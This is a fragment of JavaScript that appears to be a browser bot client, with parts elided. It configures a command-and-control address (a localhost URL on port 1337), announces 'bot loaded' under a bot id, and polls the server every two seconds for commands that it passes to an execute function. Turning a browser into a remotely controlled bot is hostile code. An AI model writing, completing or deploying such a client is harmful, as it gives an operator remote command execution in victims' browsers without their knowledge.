(function(){
    var config = {
        cCenter: 'http://127.0.0.1:1337/commands/get/',
        timer: 2000    // ms
    };
    ...
    function init (){
        ...
        console.log(window.greyKnights, ': bot loaded');

        // get commands of command center server
        (function tickTock() { // this should auto-run
            window.setTimeout(function() {
                console.log("get req")
                execCommand(requestCommands(window.greyKnights))
    ...
    function requestCommands(botId){
        return httpJSONGet(config.cCenter + botId);
    }
